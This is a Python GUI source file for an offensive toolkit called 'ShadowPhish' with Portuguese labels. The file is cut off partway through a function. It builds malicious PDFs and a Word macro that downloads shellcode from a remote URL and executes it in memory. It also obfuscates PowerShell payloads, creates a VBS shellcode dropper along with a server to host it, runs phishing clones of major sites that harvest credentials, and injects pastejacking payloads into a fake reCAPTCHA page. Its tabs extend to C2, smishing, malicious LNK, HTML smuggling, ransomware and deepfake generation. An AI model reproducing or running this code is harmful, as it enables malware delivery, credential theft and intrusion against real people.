from PySide2.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QLabel,
    QComboBox, QPushButton, QLineEdit, QTextEdit, QMessageBox, QCheckBox, QFileDialog
)

from PySide2.QtGui import QPalette, QColor
from PySide2.QtCore import Qt
from PySide2.QtCore import QTimer
import sys
import os
import subprocess
import threading
import socket



class DarkThemeApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.face_image_path = ""
        self.target_video_path = ""
        self.setWindowTitle("ShadowPhish - APT Awareness Toolkit")
        self.setGeometry(100, 100, 1000, 700)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.create_tabs()
        self.set_dark_theme()

    def create_tabs(self):
        self.artifacts_tab = QWidget()
        self.phishing_tab = QWidget()
        self.deepfake_tab = QWidget()
        self.c2_tab = QWidget()
        self.apt_tab = QWidget()
        self.gsm_tab = QWidget()
        self.lnk_tab = QWidget()
        self.htmlsm_tab = QWidget()
        self.ransomware_tab = QWidget()

        self.tabs.addTab(self.artifacts_tab, "Gerar Artefatos Maliciosos")
        self.tabs.addTab(self.phishing_tab, "Phishing & Spear-Phishing")
        self.tabs.addTab(self.deepfake_tab, "Deepfake & Deepvoice Awareness")
        self.tabs.addTab(self.c2_tab, "C2 Simulado")
        self.tabs.addTab(self.gsm_tab, "Smishing e Vishing")
        self.tabs.addTab(self.apt_tab, "Templates APT")
        self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")
        self.tabs.addTab(self.ransomware_tab, "Simulador de Ransomware")


        # --- Aba Gerar Artefatos Maliciosos ---
        layout = QVBoxLayout()

        # PDF Malicioso
        layout.addWidget(QLabel("Adicione a URL para PDF Malicioso:"))
        self.pdf_input = QTextEdit()
        layout.addWidget(self.pdf_input)
        self.pdf_btn = QPushButton("Gerar PDF")
        self.pdf_btn.clicked.connect(self.generate_pdf)
        layout.addWidget(self.pdf_btn)

        # Macro Word
        layout.addWidget(QLabel("Código VBA para Macro Word:"))
        self.macro_input = QTextEdit()
        layout.addWidget(self.macro_input)
        self.macro_btn = QPushButton("Gerar DOCX com Macro")
        self.fill_macro_btn = QPushButton("Preencher Macro Padrão")
        self.fill_macro_btn.clicked.connect(self.fill_macro_template)
        layout.addWidget(self.fill_macro_btn)
        self.macro_btn.clicked.connect(self.generate_macro)
        layout.addWidget(self.macro_btn)

        # PowerShell com opções de evasão
        layout.addWidget(QLabel("Payload PowerShell:"))
        self.ps_input = QTextEdit()
        layout.addWidget(self.ps_input)

        self.ps_base64_checkbox = QCheckBox("Codificar em Base64")
        self.ps_varsub_checkbox = QCheckBox("Substituição de Variáveis")
        self.ps_concat_checkbox = QCheckBox("Concatenação de Strings")
        self.ps_iex_checkbox = QCheckBox("Usar IEX")
        self.ps_compress_checkbox = QCheckBox("Compressão + Descompressão")

        layout.addWidget(self.ps_base64_checkbox)
        layout.addWidget(self.ps_varsub_checkbox)
        layout.addWidget(self.ps_concat_checkbox)
        layout.addWidget(self.ps_iex_checkbox)
        layout.addWidget(self.ps_compress_checkbox)

        self.ps_btn = QPushButton("Gerar PS1")
        self.ps_btn.clicked.connect(self.generate_ps1)
        layout.addWidget(self.ps_btn)

        # VBS com shellcode remoto
        self.vbs_remote_btn = QPushButton("Gerar VBS Remoto + Iniciar Servidor")
        self.vbs_remote_btn.clicked.connect(self.generate_vbs_remote)
        layout.addWidget(self.vbs_remote_btn)

        self.artifacts_tab.setLayout(layout)

        # Layout para aba de Phishing & Spear-Phishing
        phishing_layout = QVBoxLayout()

        # Phishing pronto
        self.site_selector = QComboBox()
        self.site_selector.addItems([
            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Steam", "Twitter", "Playstation",
            "Tiktok", "Mediafire", "Twitch", "Pinterest", "Snapchat", "Linkedin", "Ebay", "Quora", "Protonmail",
            "Spotify", "Reddit", "Adobe", "Gitlab", "DeviantArt", "Badoo", "Origin", "DropBox", "Yahoo",
            "Wordpress", "Yandex", "StackoverFlow", "Vk", "XBOX", "Github"
        ])
        phishing_layout.addWidget(self.site_selector)

        self.launch_phish_btn = QPushButton("Iniciar Site de Phishing")
        self.launch_phish_btn.clicked.connect(self.start_phish_server)
        phishing_layout.addWidget(self.launch_phish_btn)

        self.phish_url_label = QLabel("URL do phishing aparecerá aqui...")
        phishing_layout.addWidget(self.phish_url_label)

        phishing_layout.addWidget(QLabel("Credenciais Coletadas:"))
        self.creds_output = QTextEdit()
        self.creds_output.setReadOnly(True)
        phishing_layout.addWidget(self.creds_output)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Recaptcha Falso (Pastejack) ---
        phishing_layout.addWidget(QLabel("Geração de Recaptcha Falso com CTRL+C Automático:"))
        self.recaptcha_btn = QPushButton("Gerar Recaptcha Falso")
        self.recaptcha_btn.clicked.connect(self.generate_fake_recaptcha)
        phishing_layout.addWidget(self.recaptcha_btn)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Aba Deepfake & Deepvoice Awareness ---
        deepfake_layout = QVBoxLayout()

        # Deepfake de vídeo
        deepfake_layout.addWidget(QLabel("Geração de Vídeo com Troca de Rosto (Deepfake):"))

        self.source_img_btn = QPushButton("Selecionar Imagem de Rosto (Fonte)")
        self.source_img_btn.clicked.connect(self.select_face_image)
        deepfake_layout.addWidget(self.source_img_btn)

        self.target_video_btn = QPushButton("Selecionar Vídeo com Rosto (Alvo)")
        self.target_video_btn.clicked.connect(self.select_target_video)
        deepfake_layout.addWidget(self.target_video_btn)

        self.run_deepfake_btn = QPushButton("Iniciar Deepfake com FaceFusion")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("Nenhum deepfake gerado ainda.")
        deepfake_layout.addWidget(self.deepfake_status)

        self.run_deepfake_btn = QPushButton("Iniciar Deepfake")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("Nenhum vídeo processado ainda.")
        deepfake_layout.addWidget(self.deepfake_status)

        # Deep Voice
        deepfake_layout.addWidget(QLabel("Geração de Voz Clonada (DeepVoice):"))
        self.voice_input = QTextEdit()
        deepfake_layout.addWidget(self.voice_input)

        self.voice_selector = QComboBox()
        self.voice_selector.addItems(["Obama", "Elon Musk", "Genérica", "Treinada"])
        deepfake_layout.addWidget(self.voice_selector)

        self.voice_btn = QPushButton("Gerar Voz Clonada")
        self.voice_btn.clicked.connect(self.generate_deepvoice_audio)
        deepfake_layout.addWidget(self.voice_btn)

        self.deepvoice_status = QLabel("Nenhum áudio gerado ainda.")
        deepfake_layout.addWidget(self.deepvoice_status)

        self.deepfake_tab.setLayout(deepfake_layout)


        # Seleção do tipo de sistema
        c2_layout = QVBoxLayout()
        self.c2_os_selector = QComboBox()
        self.c2_os_selector.addItems(["Windows", "Linux", "macOS"])
        self.c2_os_selector.setToolTip("Tipo de payload/sistema de destino")
        c2_layout.addWidget(QLabel("Sistema Operacional de Destino:"))
        c2_layout.addWidget(self.c2_os_selector)

        # Seletor de plataforma
        self.c2_platform_selector = QComboBox()
        self.c2_platform_selector.addItems(["Windows", "Linux", "macOS"])
        self.c2_platform_selector.setCurrentText("Windows")
        c2_layout.addWidget(QLabel("Selecionar Plataforma do Payload:"))
        c2_layout.addWidget(self.c2_platform_selector)

        # Inputs de IP e Porta
        self.c2_ip_input = QLineEdit()
        self.c2_ip_input.setPlaceholderText("IP do Listener (ex: 127.0.0.1)")
        c2_layout.addWidget(self.c2_ip_input)

        self.c2_port_input = QLineEdit()
        self.c2_port_input.setPlaceholderText("Porta (ex: 4444)")
        c2_layout.addWidget(self.c2_port_input)

        # Botão para gerar o payload
        self.generate_payload_btn = QPushButton("Gerar Payload e Compilar")
        self.generate_payload_btn.clicked.connect(self.generate_c2_payload)
        c2_layout.addWidget(self.generate_payload_btn)

        # Terminal de output
        self.c2_terminal = QTextEdit()
        self.c2_terminal.setReadOnly(True)
        c2_layout.addWidget(self.c2_terminal)

        # Comandos rápidos
        self.cmd_buttons = []
        self.cmds_container = QWidget()
        self.cmds_layout = QVBoxLayout()
        self.cmds_container.setLayout(self.cmds_layout)
        c2_layout.addWidget(self.cmds_container)



        # Campo de comando manual
        self.manual_cmd = QLineEdit()
        self.manual_cmd.setPlaceholderText("Digite um comando manual...")
        c2_layout.addWidget(self.manual_cmd)

        self.send_cmd_btn = QPushButton("Enviar Comando")
        self.send_cmd_btn.clicked.connect(lambda: self.send_c2_command(self.manual_cmd.text()))
        c2_layout.addWidget(self.send_cmd_btn)

        self.c2_tab.setLayout(c2_layout)

        # Parte de socket e payloads
        self.listener_socket = None
        self.client_socket = None
        
        # Seletor de APT

        apt_layout = QVBoxLayout()

        apt_layout.addWidget(QLabel("Selecione o Grupo APT:"))
        self.apt_selector = QComboBox()
        self.apt_selector.addItems(["APT29", "FIN7", "APT41"])
        apt_layout.addWidget(self.apt_selector)

        # Botão para gerar template
        self.generate_apt_btn = QPushButton("Gerar Cadeia de Ataque")
        self.generate_apt_btn.clicked.connect(self.generate_apt_chain)
        apt_layout.addWidget(self.generate_apt_btn)

        # Visualização do template
        self.apt_output = QTextEdit()
        self.apt_output.setReadOnly(True)
        apt_layout.addWidget(self.apt_output)

        # Status
        self.apt_status = QLabel("Status: Aguardando seleção.")
        apt_layout.addWidget(self.apt_status)

        self.apt_tab.setLayout(apt_layout)

        gsm_layout = QVBoxLayout()
        gsm_layout.addWidget(QLabel("Número de Destino (com DDI):"))
        self.gsm_number_input = QLineEdit()
        self.gsm_number_input.setPlaceholderText("+5511999999999")
        gsm_layout.addWidget(self.gsm_number_input)

        # Escolher tipo: Smishing ou Vishing
        self.gsm_type_selector = QComboBox()
        self.gsm_type_selector.addItems(["Smishing (SMS)", "Vishing (Ligação)"])
        gsm_layout.addWidget(QLabel("Tipo de Envio:"))
        gsm_layout.addWidget(self.gsm_type_selector)

        # --- Autenticação Twilio ---
        gsm_layout.addWidget(QLabel("Twilio Account SID:"))
        self.twilio_sid_input = QLineEdit()
        gsm_layout.addWidget(self.twilio_sid_input)

        gsm_layout.addWidget(QLabel("Twilio Auth Token:"))
        self.twilio_token_input = QLineEdit()
        self.twilio_token_input.setEchoMode(QLineEdit.Password)
        gsm_layout.addWidget(self.twilio_token_input)

        gsm_layout.addWidget(QLabel("Número de Envio (From):"))
        self.twilio_from_input = QLineEdit()
        self.twilio_from_input.setPlaceholderText("+15017122661")
        gsm_layout.addWidget(self.twilio_from_input)

        # Mensagem para SMS
        gsm_layout.addWidget(QLabel("Corpo da Mensagem SMS:"))
        self.gsm_msg_input = QTextEdit()
        gsm_layout.addWidget(self.gsm_msg_input)

        # Upload de Áudio
        gsm_layout.addWidget(QLabel("Áudio para Ligação (URL ou upload local):"))
        self.gsm_audio_path = QLineEdit()
        self.gsm_audio_path.setPlaceholderText("https://dominio.com/audio.mp3 ou escolha abaixo")
        gsm_layout.addWidget(self.gsm_audio_path)

        self.gsm_audio_browse = QPushButton("Selecionar Arquivo de Áudio")
        self.gsm_audio_browse.clicked.connect(self.select_audio_file)
        gsm_layout.addWidget(self.gsm_audio_browse)

        # Botão de envio
        self.gsm_send_btn = QPushButton("Enviar")
        self.gsm_send_btn.clicked.connect(self.send_gsm_action)
        gsm_layout.addWidget(self.gsm_send_btn)

        self.gsm_status = QLabel("Status: Aguardando ação...")
        gsm_layout.addWidget(self.gsm_status)

        self.gsm_tab.setLayout(gsm_layout)

        #Gerador de LNK

        self.lnk_tab = QWidget()
        self.tabs.addTab(self.lnk_tab, "Gerador de LNK Malicioso")

        lnk_layout = QVBoxLayout()

        lnk_layout.addWidget(QLabel("Caminho do Executável ou Script (Payload):"))
        self.lnk_payload_input = QLineEdit()
        lnk_layout.addWidget(self.lnk_payload_input)

        lnk_layout.addWidget(QLabel("Nome do Atalho (.lnk):"))
        self.lnk_name_input = QLineEdit()
        self.lnk_name_input.setPlaceholderText("exemplo.lnk")
        lnk_layout.addWidget(self.lnk_name_input)

        lnk_layout.addWidget(QLabel("Ícone Personalizado (opcional):"))
        self.lnk_icon_input = QLineEdit()
        lnk_layout.addWidget(self.lnk_icon_input)

        self.lnk_icon_browse = QPushButton("Selecionar Ícone (.ico)")
        self.lnk_icon_browse.clicked.connect(self.select_icon_file)
        lnk_layout.addWidget(self.lnk_icon_browse)

        lnk_layout.addWidget(QLabel("Local para salvar o atalho:"))
        self.lnk_output_dir = QLineEdit()
        lnk_layout.addWidget(self.lnk_output_dir)

        self.lnk_dir_browse = QPushButton("Selecionar Pasta de Destino")
        self.lnk_dir_browse.clicked.connect(self.select_output_folder)
        lnk_layout.addWidget(self.lnk_dir_browse)

        self.lnk_hidden_checkbox = QCheckBox("Executar em modo invisível")
        lnk_layout.addWidget(self.lnk_hidden_checkbox)

        self.lnk_generate_btn = QPushButton("Gerar Atalho Malicioso")
        self.lnk_generate_btn.clicked.connect(self.generate_lnk_malware)
        lnk_layout.addWidget(self.lnk_generate_btn)

        self.lnk_status = QLabel("Status: Aguardando ação...")
        lnk_layout.addWidget(self.lnk_status)

        self.lnk_tab.setLayout(lnk_layout)

        # --- Aba HTML Smuggling ---
        self.htmlsm_tab = QWidget()
        self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")

        htmlsm_layout = QVBoxLayout()

        htmlsm_layout.addWidget(QLabel("Selecionar Arquivo para Embutir (será convertido em Base64):"))
        self.htmlsm_file_input = QLineEdit()
        htmlsm_layout.addWidget(self.htmlsm_file_input)

        self.htmlsm_browse_btn = QPushButton("Selecionar Arquivo")
        self.htmlsm_browse_btn.clicked.connect(self.select_htmlsm_file)
        htmlsm_layout.addWidget(self.htmlsm_browse_btn)

        htmlsm_layout.addWidget(QLabel("URL da Imagem (opcional):"))
        self.htmlsm_image_url = QLineEdit()
        self.htmlsm_image_url.setPlaceholderText("https://exemplo.com/imagem.jpg")
        htmlsm_layout.addWidget(self.htmlsm_image_url)

        htmlsm_layout.addWidget(QLabel("Nome do Arquivo de Download:"))
        self.htmlsm_output_filename = QLineEdit()
        self.htmlsm_output_filename.setText("arquivo_malicioso.iso")
        htmlsm_layout.addWidget(self.htmlsm_output_filename)

        self.htmlsm_generate_btn = QPushButton("Gerar HTML Smuggling")
        self.htmlsm_generate_btn.clicked.connect(self.generate_htmlsm)
        htmlsm_layout.addWidget(self.htmlsm_generate_btn)

        htmlsm_layout.addWidget(QLabel("Modo de Entrega:"))
        self.htmlsm_mode_selector = QComboBox()
        self.htmlsm_mode_selector.addItems(["Clique na Imagem", "Download Automático"])
        htmlsm_layout.addWidget(self.htmlsm_mode_selector)

        self.htmlsm_status = QLabel("Status: Aguardando ação...")
        htmlsm_layout.addWidget(self.htmlsm_status)

        self.htmlsm_open_btn = QPushButton("Abrir no Navegador")
        self.htmlsm_open_btn.setEnabled(False)
        self.htmlsm_open_btn.clicked.connect(self.open_htmlsm_in_browser)
        htmlsm_layout.addWidget(self.htmlsm_open_btn)


        self.htmlsm_tab.setLayout(htmlsm_layout)


        # --- Aba Simulador de Ransomware ---
        ransom_layout = QVBoxLayout()

        ransom_layout.addWidget(QLabel("Nome do Ransomware:"))
        self.ransomware_name_input = QLineEdit()
        self.ransomware_name_input.setPlaceholderText("Ex: SimRansom")
        ransom_layout.addWidget(self.ransomware_name_input)

        ransom_layout.addWidget(QLabel("Chave AES-256 (texto livre, será convertida):"))
        self.ransomware_key_input = QLineEdit()
        self.ransomware_key_input.setPlaceholderText("Ex: minhaSuperChave123")
        ransom_layout.addWidget(self.ransomware_key_input)

        ransom_layout.addWidget(QLabel("IV (hexadecimal, 32 caracteres — opcional):"))
        self.ransomware_iv_input = QLineEdit()
        self.ransomware_iv_input.setPlaceholderText("Ex: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6")
        ransom_layout.addWidget(self.ransomware_iv_input)

        ransom_layout.addWidget(QLabel("Cifra a ser usada:"))
        self.ransomware_cipher_selector = QComboBox()
        self.ransomware_cipher_selector.addItems(["RC4", "XOR"])
        ransom_layout.addWidget(self.ransomware_cipher_selector)

        ransom_layout.addWidget(QLabel("Sistema Operacional (compilação):"))
        self.ransomware_os_selector = QComboBox()
        self.ransomware_os_selector.addItems(["Windows"])  # futuros: Linux, macOS
        ransom_layout.addWidget(self.ransomware_os_selector)

        self.ransomware_generate_btn = QPushButton("Gerar Simulador de Ransomware")
        self.ransomware_generate_btn.clicked.connect(self.generate_sim_ransomware)
        ransom_layout.addWidget(self.ransomware_generate_btn)

        # ⬅️ Label de status da ação
        self.ransom_status = QLabel("Status: Aguardando ação...")
        ransom_layout.addWidget(self.ransom_status)

        self.ransomware_tab.setLayout(ransom_layout)




    def set_dark_theme(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(30, 30, 30))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(25, 25, 25))
        palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(45, 45, 45))
        palette.setColor(QPalette.ButtonText, Qt.white)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Link, QColor(42, 130, 218))
        palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)

    # Placeholders para os botões — você insere os códigos quando quiser
    def generate_pdf(self):
        host = self.pdf_input.toPlainText().strip()
        if not host:
            QMessageBox.warning(self, "Erro", "Insira a URL para o PDF malicioso.")
            return

        try:
            filename = "badphish.pdf"
            with open(filename, "w") as file:
                file.write('%PDF-1.7\n\n')
                file.write('1 0 obj\n')
                file.write('  << /Type /Catalog\n')
                file.write('     /Pages 2 0 R\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('2 0 obj\n')
                file.write('  << /Type /Pages\n')
                file.write('     /Kids [3 0 R]\n')
                file.write('     /Count 1\n')
                file.write('     /MediaBox [0 0 595 842]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('3 0 obj\n')
                file.write('  << /Type /Page\n')
                file.write('     /Parent 2 0 R\n')
                file.write('     /Resources\n')
                file.write('      << /Font\n')
                file.write('          << /F1\n')
                file.write('              << /Type /Font\n')
                file.write('                 /Subtype /Type1\n')
                file.write('                 /BaseFont /Courier\n')
                file.write('              >>\n')
                file.write('          >>\n')
                file.write('      >>\n')
                file.write('     /Annots [<< /Type /Annot\n')
                file.write('                 /Subtype /Link\n')
                file.write('                 /Open true\n')
                file.write('                 /A 5 0 R\n')
                file.write('                 /H /N\n')
                file.write('                 /Rect [0 0 595 842]\n')
                file.write('              >>]\n')
                file.write('     /Contents [4 0 R]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('4 0 obj\n')
                file.write('  << /Length 67 >>\n')
                file.write('stream\n')
                file.write('  BT\n')
                file.write('    /F1 22 Tf\n')
                file.write('    30 800 Td\n')
                file.write('    (PDF Blocked: \'Click Here\') Tj\n')
                file.write('  ET\n')
                file.write('endstream\n')
                file.write('endobj\n\n')
                file.write('5 0 obj\n')
                file.write('  << /Type /Action\n')
                file.write('     /S /URI\n')
                file.write('     /URI (' + host + '/)\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('xref\n')
                file.write('0 6\n')
                file.write('0000000000 65535 f\n')
                file.write('0000000010 00000 n\n')
                file.write('0000000069 00000 n\n')
                file.write('0000000170 00000 n\n')
                file.write('0000000629 00000 n\n')
                file.write('0000000749 00000 n\n')
                file.write('trailer\n')
                file.write('  << /Root 1 0 R\n')
                file.write('     /Size 6\n')
                file.write('  >>\n')
                file.write('startxref\n')
                file.write('854\n')
                file.write('%%EOF\n')

            QMessageBox.information(self, "Sucesso", f"PDF malicioso salvo como {filename}!")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar PDF:\n{str(e)}")

    def fill_macro_template(self):
        from PySide2.QtWidgets import QInputDialog

        url, ok1 = QInputDialog.getText(self, "URL do Shellcode", "Insira a URL do shellcode:")
        if not ok1 or not url:
            return

        path, ok2 = QInputDialog.getText(self, "Caminho para salvar", "Insira o caminho (ex: C:\\Users\\Public\\shellcode.bin):")
        if not ok2 or not path:
            return

        vba_code = f'''Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As LongPtr, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim shellcodePath As String
    shellcodePath = "{path}"
    
    If DownloadFile("{url}/shellcode.bin", shellcodePath) Then
        ExecuteShellcode shellcodePath
    End If
End Sub

Function DownloadFile(URL As String, filePath As String) As Boolean
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile filePath, 2
        objADOStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If

    On Error GoTo 0
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
End Function

Sub ExecuteShellcode(filePath As String)
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile(filePath)
    
    If UBound(sc) < 0 Then Exit Sub
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    
    RtlMoveMemory addr, sc(0), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    If Dir(filePath) = "" Then Exit Function
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    
    If fileSize = 0 Then
        Close #fileNum
        Exit Function
    End If
    
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function'''

        self.macro_input.setPlainText(vba_code)
        QMessageBox.information(self, "Macro Padrão", "Código VBA preenchido com sucesso!")

    def generate_macro(self):
        content = self.macro_input.toPlainText().strip()

        if not content:
            QMessageBox.warning(self, "Aviso", "O campo da macro está vazio.")
            return

        try:
            filename = "macro_payload.vba"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)

            QMessageBox.information(self, "Macro", f"Documento VBA salvo como '{filename}'.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Ocorreu um erro ao salvar o arquivo:\n{str(e)}")


    def generate_ps1(self):
        import zlib
        import base64
        import random
        import string

        raw_code = self.ps_input.toPlainText().strip()
        use_b64 = self.ps_base64_checkbox.isChecked()
        use_vars = self.ps_varsub_checkbox.isChecked()
        use_concat = self.ps_concat_checkbox.isChecked()
        use_iex = self.ps_iex_checkbox.isChecked()
        use_compress = self.ps_compress_checkbox.isChecked()

        if not raw_code:
            QMessageBox.warning(self, "Aviso", "Insira um script PowerShell.")
            return

        try:
            result = raw_code

            # Substituição de variáveis
            if use_vars:
                var_name = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"${var_name} = \"{result}\"\n"

                if use_iex:
                    result += f"IEX (${var_name})"
                else:
                    result += f"Invoke-Expression (${var_name})"

            # Concatenação de strings
            if use_concat:
                chunks = [f'"{c}"' for c in raw_code]
                joined = '+'.join(chunks)
                result = f"$cmd = {joined}\n"
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Compressão e descompressão
            if use_compress:
                compressed = zlib.compress(raw_code.encode("utf-8"))
                compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                rand1 = ''.join(random.choices(string.ascii_letters, k=8))
                rand2 = ''.join(random.choices(string.ascii_letters, k=8))
                rand3 = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"""
${rand1} = "{compressed_b64}"
${rand2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${rand1}))
${rand3} = New-Object IO.Compression.DeflateStream(${rand2}, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader(${rand3}, [Text.Encoding]::UTF8)
$cmd = $reader.ReadToEnd()
"""
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Base64 final
            if use_b64:
                encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

            # Salvar
            with open("payload_obfuscated.ps1", "w", encoding="utf-8") as f:
                f.write(result)

            QMessageBox.information(self, "Sucesso", "Script PowerShell salvo como 'payload_obfuscated.ps1'.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar PS1:\n{str(e)}")



    def generate_vbs_remote(self):
        import http.server
        import socketserver
        import threading
        import shutil
        from PySide2.QtWidgets import QInputDialog

        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Shellcode (.bin)", "", "BIN Files (*.bin)")
        if not path:
            return

        # Pede IP e Porta
        ip, ok1 = QInputDialog.getText(self, "IP para download", "Digite o IP que será usado no VBS (ex: 192.168.1.10):")
        if not ok1 or not ip:
            return

        port, ok2 = QInputDialog.getText(self, "Porta do servidor", "Digite a porta do servidor HTTP (ex: 8000):")
        if not ok2 or not port.isdigit():
            return
        port = int(port)

        try:
            # Copia shellcode.bin para pasta de saída
            os.makedirs("outputs", exist_ok=True)
            bin_dest = os.path.join("outputs", "shellcode.bin")
            shutil.copy(path, bin_dest)

            # Cria VBS dropper
            vbs_code = f"""Set xHttp = CreateObject("MSXML2.XMLHTTP")
xHttp.Open "GET", "http://{ip}:{port}/shellcode.bin", False
xHttp.Send

If xHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xHttp.ResponseBody
    stream.SaveToFile "C:\\Users\\Public\\shellcode.bin", 2
    stream.Close
End If
"""

            vbs_path = os.path.join("outputs", "dropper.vbs")
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs_code)

            # Inicia o servidor embutido para servir o .bin
            def start_server():
                os.chdir("outputs")
                handler = http.server.SimpleHTTPRequestHandler
                with socketserver.TCPServer(("", port), handler) as httpd:
                    print(f"[*] Servidor HTTP iniciado em http://0.0.0.0:{port}")
                    httpd.serve_forever()

            thread = threading.Thread(target=start_server, daemon=True)
            thread.start()

            QMessageBox.information(self, "Sucesso", f"VBS gerado como 'dropper.vbs' e servidor HTTP ativo na porta {port}.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar VBS remoto:\n{str(e)}")


    def start_phish_server(self):
        import os
        import subprocess
        import random
        import threading
        import time

        site_name = self.site_selector.currentText().lower()
        site_path = os.path.join(".sites", site_name)

        if not os.path.exists(site_path):
            QMessageBox.critical(self, "Erro", f"O template .sites/{site_name} não foi encontrado.")
            return

        port = random.randint(8000, 8999)

        try:
            # Inicia o servidor PHP
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=site_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            self.phish_url_label.setText(f"<b>Servidor ativo (PHP):</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

            # Inicia monitoramento do usernames.txt
        
        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Falha ao iniciar servidor PHP:\n{str(e)}")
        self.cred_path = os.path.join(site_path, "usernames.txt")
        self.last_creds = ""
        self.timer = QTimer()
        self.timer.timeout.connect(self.check_credentials_file)
        self.timer.start(2000)  # a cada 2 segundos

    def check_credentials_file(self):
        if os.path.exists(self.cred_path):
            with open(self.cred_path, "r", encoding="utf-8") as f:
                content = f.read()
            if content != self.last_creds:
                self.creds_output.setPlainText(content)
                self.last_creds = content


    def generate_fake_recaptcha(self):
        import os
        import re
        import random
        import subprocess
        from PySide2.QtWidgets import QInputDialog, QMessageBox

        base_path = ".fake-recaptcha"
        js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
        html_path = os.path.join(base_path, "index.html")

        if not os.path.exists(js_path) or not os.path.exists(html_path):
            QMessageBox.critical(self, "Erro", f"Arquivos não encontrados na pasta '.fake-recaptcha'.")
            return

        # Input do payload
        payload, ok = QInputDialog.getMultiLineText(self, "Payload", "Insira o payload a ser copiado:")
        if not ok or not payload.strip():
            return
        payload = payload.strip().replace('"', '\\"')

        # Seleção de sistema operacional
        sistemas = ["Windows", "Linux", "macOS"]
        sistema, ok = QInputDialog.getItem(self, "Sistema Alvo", "Selecione o sistema alvo:", sistemas, editable=False)
        if not ok or not sistema:
            return

        try:
            # Atualiza a variável const payload no JavaScript
            with open(js_path, "r", encoding="utf-8") as f:
                js_content = f.read()

            new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload}`;', js_content, flags=re.DOTALL)

            with open(js_path, "w", encoding="utf-8") as f:
                f.write(new_js)

        except Exception as e:
